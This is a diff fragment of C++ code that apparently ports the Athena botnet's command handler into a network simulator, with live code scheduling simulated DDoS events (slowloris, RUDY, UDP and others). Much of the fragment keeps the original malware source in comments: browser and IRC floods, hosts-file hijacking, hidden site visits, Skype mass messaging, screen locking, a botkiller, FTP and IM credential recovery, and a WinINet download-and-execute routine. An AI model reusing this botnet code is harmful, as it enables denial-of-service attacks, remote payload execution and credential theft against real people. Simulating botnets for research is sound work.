+                            StartUserFlood(TRUE, pcArguments);
+                        else
+                            StartUserFlood(FALSE, pcArguments);
+                    }
+                }
+
+                if(bValidCommand)
+                {
+                    if(SendToAllWarIrcConnections(cBuild))
+                        bCommandSubmitted = TRUE;
+                }
+
+                if(bCommandSubmitted)
+                    SendSuccessfulWarSubmit(pcCheckCommand);
+            }
+        }
+#endif
+*/
+
+        else if(strstr(pcCheckCommand, "ddos.")) {
+            pcCheckCommand += 5;
+
+            if(strstr(pcCheckCommand, "browser")) {
+                /* DDoS Browser command -- not implemented */
+                /*
+                if(!bBrowserDdosBusy) {
+                    bool bValidParameters = true;
+
+                    char *pcBreakString = strtok(pcArguments, " ");
+
+                    if(pcBreakString != NULL)
+                        strcpy(cStoreParameter, pcBreakString);
+                    else
+                        bValidParameters = false;
+
+                    pcBreakString = strtok(NULL, " ");
+                    if(pcBreakString != NULL)
+                        dwStoreParameter = atoi(pcBreakString);
+                    else
+                        bValidParameters = false;
+
+                    if((dwStoreParameter > 1) && (bValidParameters)) {
+                        // handle hthread is were the action happens
+                        HANDLE hThread = CreateThread(NULL, NULL, MassBrowserDdos, NULL, NULL, NULL);
+
+                        if(!hThread) ;
+                        else {
+                            bBrowserDdosBusy = true;
+                            CloseHandle(hThread);
+                        }
+                    }
+                }
+                */
+            }
+            else {
+                // All others use the same DDoS attack method
+                bool bBusy = false;
+
+                if(strstr(pcCheckCommand, "http.")) {
+                    if(bDdosBusy)
+                        bBusy = true;
+                }
+                else if(strstr(pcCheckCommand, "layer4.")) {
+                    if(bDdosBusy)
+                        bBusy = true;
+                }
+                else
+                    bBusy = true;
+
+                if(!bBusy) {
+                    char *pcBreakString = strtok(pcArguments, " ");
+
+                    char cTargetUrl[strlen(pcBreakString)];
+                    if(pcBreakString != NULL)
+                        strcpy(urlTarget, pcBreakString);
+
+                    unsigned short usTargetPort = 0;
+
+                    if(!strstr(pcCheckCommand, "bandwith")) {
+                        pcBreakString = strtok(NULL, " ");
+                        if(pcBreakString != NULL)
+                            usTargetPort = atoi(pcBreakString);
+                    }
+
+                    DWORD dwAttackLength = 0;
+                    pcBreakString = strtok(NULL, " ");
+                    if(pcBreakString != NULL)
+                        dwAttackLength = atoi(pcBreakString);
+
+                    if((strstr(pcCheckCommand, "rapidget"))
+                            || (strstr(pcCheckCommand, "rapidpost"))
+                            || (strstr(pcCheckCommand, "slowpost"))
+                            || (strstr(pcCheckCommand, "slowloris"))
+                            || (strstr(pcCheckCommand, "rudy"))
+                            || (strstr(pcCheckCommand, "arme"))
+                            || (strstr(pcCheckCommand, "bandwith"))
+                            || (strstr(pcCheckCommand, "combo"))
+                            || (strstr(pcCheckCommand, "udp"))
+                            || (strstr(pcCheckCommand, "ecf")))
+                    {
+                        if(strstr(pcCheckCommand, "bandwith"))
+                            usTargetPort = 80;
+
+                        if((strstr(cTargetUrl, ".")) && (usTargetPort < 65545) && (dwAttackLength > 0)) {
+                            if((usTargetPort >= 0 && strstr(pcCheckCommand, "udp")) || (usTargetPort > 0 && !strstr(pcCheckCommand, "udp"))) {
+                                scheduleAt(simTime() + (simtime_t) 1, ddos);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        /* HTTP Status command */
+        /*
+        else if(strstr(pcCheckCommand, "http")) {
+            strcpy(cStoreParameter, pcArguments);
+
+            if(strstr(pcCheckCommand, "status")) {
+                HANDLE hThread = CreateThread(NULL, NULL, GetWebsiteStatus, NULL, NULL, NULL);
+            }
+
+            /* HOSTBLOCK commands */
+            /*
+#ifdef INCLUDE_HOSTBLOCK
+            if(strstr(pcCheckCommand, "block"))
+            {
+                if(BlockHost(pcArguments))
+                    SendSuccessfullyBlockedHost(pcArguments);
+            }
+            else if(strstr(pcCheckCommand, "redirect"))
+            {
+                bool bValidParameters = TRUE;
+
+                char cOriginalHost[DEFAULT];
+                char cRedirectToHost[DEFAULT];
+
+                char *pcBreakString = strtok(pcArguments, " ");
+                if(pcBreakString != NULL)
+                {
+                    if(strstr(pcBreakString, "."))
+                        strcpy(cOriginalHost, pcBreakString);
+                    else
+                        bValidParameters = FALSE;
+                }
+                else
+                    bValidParameters = FALSE;
+
+                pcBreakString = strtok(NULL, " ");
+                if(pcBreakString != NULL)
+                {
+                    if(strstr(pcBreakString, "."))
+                        strcpy(cRedirectToHost, pcBreakString);
+                    else
+                        bValidParameters = FALSE;
+                }
+                else
+                    bValidParameters = FALSE;
+
+                if(bValidParameters)
+                {
+                    if(RedirectHost(cOriginalHost, cRedirectToHost))
+                        SendSuccessfullyRedirectedHost(cOriginalHost, cRedirectToHost);
+                }
+                else
+                    SendInvalidParameters();
+            }
+#endif
+        }
+    */
+
+            /* VISIT commands */
+            /*
+#ifdef INCLUDE_VISIT
+        else if(strstr(pcCheckCommand, "smartview"))
+        {
+            pcCheckCommand += 10;
+
+            bool bValidParameters = TRUE;
+
+            char *pcBreakString = strtok(pcArguments, " ");
+
+            if(pcBreakString != NULL)
+            {
+                if(strstr(pcBreakString, "."))
+                    strcpy(cStoreParameter, pcBreakString);
+                else
+                    bValidParameters = FALSE;
+            }
+
+            if(strstr(pcCheckCommand, "add"))
+                dwSmartViewCommandType = SMARTVIEW_ADD_ENTRY;
+            else if(strstr(pcCheckCommand, "del"))
+                dwSmartViewCommandType = SMARTVIEW_DEL_ENTRY;
+            else
+                bValidParameters = FALSE;
+
+            if(dwSmartViewCommandType == SMARTVIEW_ADD_ENTRY)
+            {
+                pcBreakString = strtok(NULL, " ");
+                if(pcBreakString != NULL)
+                    uiSecondsBeforeVisit = atoi(pcBreakString);
+                else
+                    bValidParameters = FALSE;
+
+                pcBreakString = strtok(NULL, " ");
+                if(pcBreakString != NULL)
+                    uiSecondsAfterVisit = atoi(pcBreakString);
+                else
+                    bValidParameters = FALSE;
+
+                if(bValidParameters)
+                {
+                    if(!SmartView())
+                    {
+#ifndef HTTP_BUILD
+                        SendThreadCreationFail();
+#endif
+                    }
+                }
+                else
+                {
+#ifndef HTTP_BUILD
+                    SendInvalidParameters();
+#endif
+                }
+            }
+            else if(dwSmartViewCommandType == SMARTVIEW_DEL_ENTRY)
+                strcpy(cStoreParameter, pcArguments);
+        }
+#endif
+#ifdef INCLUDE_VISIT
+        else if(strstr(pcCheckCommand, "view"))
+        {
+            bool bHidden = FALSE;
+
+            if(strstr(pcCheckCommand, ".hidden"))
+                bHidden = TRUE;
+
+            char *pcVisitReturn = SimpleVisit(pcArguments, bHidden);
+            if(!strstr(pcVisitReturn, "ERR_FAILED_TO_START"))
+            {
+#ifndef HTTP_BUILD
+                SendSimpleVisitSuccess(pcArguments, pcVisitReturn, bHidden);
+#else
+                for(unsigned short us = 0; us < 6; us++)
+                {
+                    if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                        break;
+
+                    Sleep(10000);
+                }
+#endif
+            }
+            else
+            {
+#ifndef HTTP_BUILD
+                SendWebsiteOpenFail(pcArguments);
+#endif
+            }
+        }
+#endif
+*/
+
+            /* SKYPE MASS MESSENGER commands */
+            /*
+#ifdef INCLUDE_SKYPE_MASS_MESSENGER
+        else if(strstr(pcCheckCommand, "skype"))
+        {
+            char cSkypePath[MAX_PATH];
+            memset(cSkypePath, 0, sizeof(cSkypePath));
+
+            if(SkypeExists(cSkypePath, sizeof(cSkypePath)))
+            {
+                int nSentMessages = MassMessageSkypeContacts(cSkypePath, pcArguments);
+
+#ifndef HTTP_BUILD
+                SendSkypeMessagesSent(nSentMessages);
+#else
+                for(unsigned short us = 0; us < 6; us++)
+                {
+                    if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                        break;
+
+                    Sleep(10000);
+                }
+#endif
+            }
+        }
+#endif
+*/
+    }
+    else {
+        /* Lock commands */
+        /*
+        if(strstr(pcCheckCommand, "lock")) {
+            /* LOCK commands */
+            /*
+#ifdef INCLUDE_LOCK
+            pcCheckCommand += 5;
+
+            if(strstr(pcCheckCommand, "off"))
+            {
+                if(bLockComputer)
+                {
+                    UnLockComputer();
+#ifndef HTTP_BUILD
+                    SendComputerUnLocked();
+#else
+                    for(unsigned short us = 0; us < 6; us++)
+                    {
+                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                            break;
+
+                        Sleep(10000);
+                    }
+#endif
+                }
+            }
+            else if(strstr(pcCheckCommand, "on"))
+            {
+                if(!bLockComputer)
+                {
+                    LockComputer();
+#ifndef HTTP_BUILD
+                    SendComputerLocked();
+#else
+                    for(unsigned short us = 0; us < 6; us++)
+                    {
+                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                            break;
+
+                        Sleep(10000);
+                    }
+#endif
+                }
+            }
+#endif
+        }
+    */
+
+        /* BOTKILL commands */
+        /*
+#ifdef INCLUDE_BOTKILL
+        else if(strstr(pcCheckCommand, "botkill"))
+        {
+            pcCheckCommand += 8;
+
+            if(strstr(pcCheckCommand, "once"))
+            {
+                if(!bBotkill)
+                {
+                    bBotkillOnce = TRUE;
+                    bBotkillInitiatedViaCommand = TRUE;
+                    StartBotkiller();
+
+#ifdef HTTP_BUILD
+                    for(unsigned short us = 0; us < 6; us++)
+                    {
+                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                            break;
+
+                        Sleep(10000);
+                    }
+#endif
+                }
+            }
+            else if(strstr(pcCheckCommand, "start"))
+            {
+                if(!bBotkill)
+                {
+                    StartBotkiller();
+#ifndef HTTP_BUILD
+                    SendBotkillerStarted();
+#else
+                    for(unsigned short us = 0; us < 6; us++)
+                    {
+                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                            break;
+
+                        Sleep(10000);
+                    }
+#endif
+                }
+            }
+            else if(strstr(pcCheckCommand, "stop"))
+            {
+                if(bBotkill)
+                {
+                    bBotkill = FALSE;
+#ifndef HTTP_BUILD
+                    SendBotkillerStopped();
+#else
+                    for(unsigned short us = 0; us < 6; us++)
+                    {
+                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                            break;
+
+                        Sleep(10000);
+                    }
+#endif
+                }
+            }
+            else if(strstr(pcCheckCommand, "stats"))
+            {
+#ifndef HTTP_BUILD
+                SendBotkillCount(dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges);
+#endif
+            }
+            else if(strstr(pcCheckCommand, "clear"))
+            {
+                dwKilledProcesses = 0;
+                dwFileChanges = 0;
+                dwRegistryKeyChanges = 0;
+#ifndef HTTP_BUILD
+                SendBotkillCleared();
+#endif
+            }
+        }
+#endif
+*/
+
+        /* IRC commands */
+        /*
+#ifndef HTTP_BUILD
+        else if(strstr(pcCheckCommand, "irc"))
+        {
+            pcCheckCommand += 4;
+
+            if(strstr(pcCheckCommand, "unsort"))
+            {
+                for(unsigned short us = 0; us < 7; us++)
+                {
+                    strcpy(cSend, cIrcCommandPart);
+                    strcat(cSend, " #");
+
+                    if(us == 0)
+                        strcat(cSend, GetCountry());
+                    else if(us == 1)
+                    {
+                        if(IsAdmin())
+                            strcat(cSend, "Admin");
+                        else
+                            strcat(cSend, "User");
+                    }
+                    else if(us == 2)
+                    {
+                        if(IsLaptop())
+                            strcat(cSend, "Laptop");
+                        else
+                            strcat(cSend, "Desktop");
+                    }
+                    else if(us == 3)
+                        strcat(cSend, GetOs());
+                    else if(us == 4)
+                    {
+                        strcat(cSend, "x");
+
+                        if(Is64Bits(GetCurrentProcess()))
+                            strcat(cSend, "64");
+                        else
+                            strcat(cSend, "86");
+                    }
+                    else if(us == 5)
+                    {
+                        strcat(cSend, "DotNET-");
+                        strcat(cSend, GetVersionMicrosoftDotNetVersion());
+                    }
+                    else if(us == 6)
+                        strcat(cSend, cVersion);
+
+                    SendToIrc(cSend);
+                }
+            }
+            else if(strstr(pcCheckCommand, "sort"))
+            {
+                bool bSendJoin = TRUE;
+
+                pcCheckCommand += 5;
+
+                strcpy(cSend, cIrcCommandJoin);
+                strcat(cSend, " #");
+
+                if(strstr(pcCheckCommand, "country"))
+                    strcat(cSend, GetCountry());
+                else if(strstr(pcCheckCommand, "privelages"))
+                {
+                    if(IsAdmin())
+                        strcat(cSend, "Admin");
+                    else
+                        strcat(cSend, "User");
+                }
+                else if(strstr(pcCheckCommand, "gender"))
+                {
+                    if(IsLaptop())
+                        strcat(cSend, "Laptop");
+                    else
+                        strcat(cSend, "Desktop");
+                }
+                else if(strstr(pcCheckCommand, "os"))
+                    strcat(cSend, GetOs());
+                else if(strstr(pcCheckCommand, "architecture"))
+                {
+                    strcat(cSend, "x");
+
+                    if(Is64Bits(GetCurrentProcess()))
+                        strcat(cSend, "64");
+                    else
+                        strcat(cSend, "86");
+                }
+                else if(strstr(pcCheckCommand, "dotnet"))
+                {
+                    strcat(cSend, "DotNET-");
+                    strcat(cSend, GetVersionMicrosoftDotNetVersion());
+                }
+                else if(strstr(pcCheckCommand, "version"))
+                    strcat(cSend, cVersion);
+                else
+                    bSendJoin = FALSE;
+
+                strcat(cSend, "\r\n");
+
+                if(bSendJoin)
+                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+            }
+            else if(strstr(pcCheckCommand, "reconnect"))
+            {
+                strcpy(cSend, "QUIT Reconnecting\r\n");
+                dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
+                Sleep(15000);
+                dwConnectionReturn = -1;
+            }
+        }
+#endif
+         */
+
+        if(strstr(pcCheckCommand, "ddos."))
+        {
+            pcCheckCommand += 5;
+
+            if(strstr(pcCheckCommand, "stop"))
+            {
+                if(strstr(pcCheckCommand, "browser"))
+                    bBrowserDdosBusy = false;
+                else if(bDdosBusy) {
+                    bDdosBusy = false;
+                    dosModule->desactivateModule();
+                }
+            }
+        }
+
+        /* FILESEARCH commands */
+        /*
+#ifdef INCLUDE_FILESEARCH
+        else if(strstr(pcCheckCommand, "filesearch.stop"))
+            bBusyFileSearching = FALSE;
+#endif
+*/
+
+        /* VISIT commands */
+        /*
+#ifdef INCLUDE_VISIT
+        else if(strstr(pcCheckCommand, "smartview"))
+        {
+            pcCheckCommand += 10;
+
+            if(strstr(pcCheckCommand, "clear"))
+            {
+                if(uiWebsitesInQueue > 0)
+                {
+#ifndef HTTP_BUILD
+                    SendClearSmartViewQueue(uiWebsitesInQueue);
+#else
+                    for(unsigned short us = 0; us < 6; us++)
+                    {
+                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
+                            break;
+
+                        Sleep(10000);
+                    }
+#endif
+                }
+
+                dwSmartViewCommandType = SMARTVIEW_CLEAR_QUEUE;
+            }
+        }
+#endif
+*/
+
+        else if(strstr(pcCheckCommand, "uninstall")) {
+            nUninstallTaskId = nCurrentTaskId;
+            bUninstallProgram = true;
+            scheduleAt(simTime() + (simtime_t) 1, uninstall);
+        }
+
+        /* RECOVERY commands */
+        /*
+#ifdef INCLUDE_RECOVERY
+        else if(strstr(pcCheckCommand, "recovery"))
+        {
+            pcCheckCommand += 9;
+
+            if(strstr(pcCheckCommand, "ftp"))
+            {
+                HANDLE hThread = CreateThread(NULL, NULL, RecoverFtp, NULL, NULL, NULL);
+
+                if(!hThread)
+                    SendThreadCreationFail();
+                else
+                    CloseHandle(hThread);
+            }
+            else if(strstr(pcCheckCommand, "im"))
+            {
+                HANDLE hThread = CreateThread(NULL, NULL, RecoverIm, NULL, NULL, NULL);
+
+                if(!hThread)
+                    SendThreadCreationFail();
+                else
+                    CloseHandle(hThread);
+            }
+            else if(strstr(pcCheckCommand, "browser"))
+            {
+
+            }
+        }
+#endif
+*/
+
+        /* IRCWAR commands */
+        /*
+#ifdef INCLUDE_IRCWAR
+        else if(strstr(pcCheckCommand, "war"))
+        {
+            pcCheckCommand += 4;
+
+            if(bRemoteIrcBusy)
+            {
+                if(strstr(pcCheckCommand, "status"))
+                    SendWarStatus(dwValidatedConnectionsToIrc, cCurrentWarStatus);
+                else if(strstr(pcCheckCommand, "register"))
+                {
+                    if(strstr(pcCheckCommand, "stop"))
+                    {
+                        bRegisterOnWarIrc = FALSE;
+                        SendAbortRegisterNickname();
+                    }
+                    else
+                    {
+                        HANDLE hThread = CreateThread(NULL, NULL, RegisterWithWarIrc, NULL, NULL, NULL);
+                        if(hThread)
+                            CloseHandle(hThread);
+                    }
+                }
+                else if(strstr(pcCheckCommand, "disconnect"))
+                    DisconnectFromWarIrc();
+                else if(strstr(pcCheckCommand, "newnick"))
+                {
+                    SetNewWarNicknames();
+                    SendSuccessfulWarSubmit(pcCheckCommand);
+                }
+                else if(strstr(pcCheckCommand, "stop"))
+                    bWarFlood = FALSE;
+                else if(!bWarFlood)
+                {
+                    if(strstr(pcCheckCommand, "flood.anope"))
+                    {
+                        strcpy(cStoreParameter, pcCheckCommand);
+                        StartAnopeFlood();
+                    }
+                }
+            }
+        }
+#endif
+*/
+
+        /* HOSTBLOCK commands */
+        /*
+#ifdef INCLUDE_HOSTBLOCK
+        else if(strstr(pcCheckCommand, "hosts.restore"))
+        {
+            if(RestoreHostsFile())
+                SendSuccessfullyRestoredHostsFile();
+        }
+#endif
+*/
+
+        /* IRC commands */
+        /*
+        else if(strstr(pcCheckCommand, "version"))
+        {
+            char szMd5[150];
+            memset(szMd5, 0, sizeof(szMd5));
+            GetMD5Hash(cFileSaved, szMd5, sizeof(szMd5));
+
+            sprintf(cSend, "%s %s :|| %s || 10MD5: %s || 10Executed From: %s ||", cIrcCommandPrivmsg, cChannel, cVersion, szMd5, cThisFile);
+            SendToIrc(cSend);
+        }
+        else if(strstr(pcCheckCommand, "info"))
+        {
+            sprintf(cSend, "%s %s :|| 10Uptime: %s || 10Idletime: %s || 10Key: %s || 10.NET: %s || 10RAM Usage: %ld%%",
+                    cIrcCommandPrivmsg, cChannel, GetUptime(), GetIdleTime(), cRegistryKeyAccess, GetVersionMicrosoftDotNetVersion(), GetMemoryLoad());
+            SendToIrc(cSend);
+        }
+        */
+
+    }
+    return;
+}
+
+/**
+ * General/DlExecUpdate.cpp
+ */
+void AthenaBot::DownloadExecutableFile()
+{
+    int nLocalTaskId = nCurrentTaskId;
+
+    srand(GenerateRandomSeed());
+
+    char cDownloadFrom[DEFAULT];
+    strcpy(cDownloadFrom, cDownloadFromLocation);
+
+    char cExecutionArguments[DEFAULT];
+    if(bExecutionArguments) {
+        bExecutionArguments = false;
+        strcpy(cExecutionArguments, cStoreParameter);
+    }
+    else
+        strcpy(cExecutionArguments, "N/A");
+
+    char szLocalMd5Match[150];
+    bool bMatchRequired = bMd5MustMatch;
+    memset(szLocalMd5Match, 0, sizeof(szLocalMd5Match));
+    if(bMd5MustMatch) {
+        bMd5MustMatch = false;
+        strcpy(szLocalMd5Match, szMd5Match);
+
+        memset(szMd5Match, 0, sizeof(szMd5Match));
+    }
+
+    bool bOutputMd5Hash = bGlobalOnlyOutputMd5Hash;
+    if(bGlobalOnlyOutputMd5Hash)
+        bGlobalOnlyOutputMd5Hash = false;
+
+    DWORD dwSecondsToWait = GetRandNum(dwStoreParameter);
+
+    bool bDownloadUpdate = bUpdate;
+
+    if (bDownloadAbort) {
+        bGlobalOnlyOutputMd5Hash = false;
+        bMd5MustMatch = false;
+        bExecutionArguments = false;
+        bDownloadAbort = false;
+        bUpdate = false;
+        memset(szMd5Match, 0, sizeof(szMd5Match));
+        cancelEvent(dlExec);
+    }
+    else {
+        urlDownload = strtok(strstr(cDownloadFromLocation, "://") + 3, "/");
+        fileDownload = strtok(NULL, "/");
+        scheduleAt(simTime() + (simtime_t) dwSecondsToWait, dlExec);
+    }
+
+    /** Download and execute original handler */
+    /*
+
+    char cDownloadTo[MAX_PATH + strlen(cExecutionArguments) + 3];
+    sprintf(cDownloadTo, "%s\\%s.exe", cTempDirectory, GenRandLCText());
+
+    HANDLE hInternetOpen = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+    if(hInternetOpen)
+    {
+        HANDLE hOpenUrl = InternetOpenUrl(hInternetOpen, cDownloadFrom, NULL, 0, 0, 0);
+        if(hOpenUrl)
+        {
+            HANDLE hCreateFile = CreateFile(cDownloadTo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
+            if(hCreateFile < (HANDLE)1)
+            {
+
+                InternetCloseHandle(hOpenUrl);
+                return 0;
+            }
+
+            DWORD dwBytesRead, dwBytesWrite;
+            DWORD dwTotal = 0;
+
+            do
+            {
+                char *cFileToBuffer = (char*)malloc(DOWNLOAD_MEMORY_SPACE);
+
+                memset(cFileToBuffer, 0, sizeof(cFileToBuffer));
+                InternetReadFile(hOpenUrl, cFileToBuffer, sizeof(cFileToBuffer), &dwBytesRead);
+
+                // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
+                time_t tTime;
+                struct tm *ptmTime;
+                tTime = time(NULL);
+                ptmTime = localtime(&tTime);
+                char cTodaysDate[20];
+                memset(cTodaysDate, 0, sizeof(cTodaysDate));
+                strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
+                if(atoi(cTodaysDate) >= nExpirationDateMedian)
+                    strcpy(cFileToBuffer, GenRandLCText());
+                // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
+
+                WriteFile(hCreateFile, cFileToBuffer, dwBytesRead, &dwBytesWrite, NULL);
+
+                if((dwTotal) < DOWNLOAD_MEMORY_SPACE)
+                {
+                    unsigned int uiBytesToCopy;
+                    uiBytesToCopy = DOWNLOAD_MEMORY_SPACE - dwTotal;
+
+                    if(uiBytesToCopy > dwBytesRead)
+                        uiBytesToCopy = dwBytesRead;
+
+                    memcpy(&cFileToBuffer[dwTotal], cFileToBuffer, uiBytesToCopy);
+                }
+                dwTotal += dwBytesRead;
+
+                free(cFileToBuffer);
+            }
+            while(dwBytesRead > 0);
+
+            CloseHandle(hCreateFile);
+            InternetCloseHandle(hOpenUrl);
+
+            if(FileExists(cDownloadTo))
+            {
+                char szMd5[150];
+                memset(szMd5, 0, sizeof(szMd5));
+
+                GetMD5Hash(cDownloadTo, szMd5, sizeof(szMd5));
+
+                if(!strstr(cExecutionArguments, "N/A"))
+                {
+                    strcat(cDownloadTo, " ");
+                    strcat(cDownloadTo, cExecutionArguments);
+                }
+
+                if(bDownloadUpdate)
+                {
+                    SetProgramMutex(cUpdateMutex);
+                    bBotkill = false;
+                    Sleep(1000);
+                }
+
+                if(bOutputMd5Hash)
+                {
+                    return 1;
+                }
+                else
+                {
+                    if(bMatchRequired)
+                    {
+                        if(strcmp(szMd5, szLocalMd5Match) != 0)
+                        {
+
+                            return 1;
+                        }
+                    }
+
+                    char szThisFileMd5[150];
+                    memset(szThisFileMd5, 0, sizeof(szThisFileMd5));
+                    GetMD5Hash(cFileSaved, szThisFileMd5, sizeof(szThisFileMd5));
+                    if(strcmp(szMd5, szThisFileMd5) == 0)
+                    {
+
+                            return;
+                    }
+
+                    if(StartProcessFromPath(cDownloadTo, false))
+                    {
+                        if(bDownloadUpdate)
+                        {
+                            while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+                                Sleep(10000);
+                            bUninstallProgram = true;
+                        }
+                        else
+                        {
+                            if(strstr(cExecutionArguments, "N/A"))
+                            {
+                                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+                                    Sleep(10000);
+                            }
+                            else
+                            {
+                                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+                                    Sleep(10000);
+                            }
+                        }
+                    }
+                    else
+                    {
+                        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+                            Sleep(10000);
+                    }
+                }
+            }
+            else
+            {
+                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+                    Sleep(10000);
+            }
+        }
+        else
+        {
+            while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+                Sleep(10000);
+        }
+    }
+    else
+    {
+        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
+            Sleep(10000);
+    }
+*/
+
+    return;
 }
 
 } /* namespace simbo */
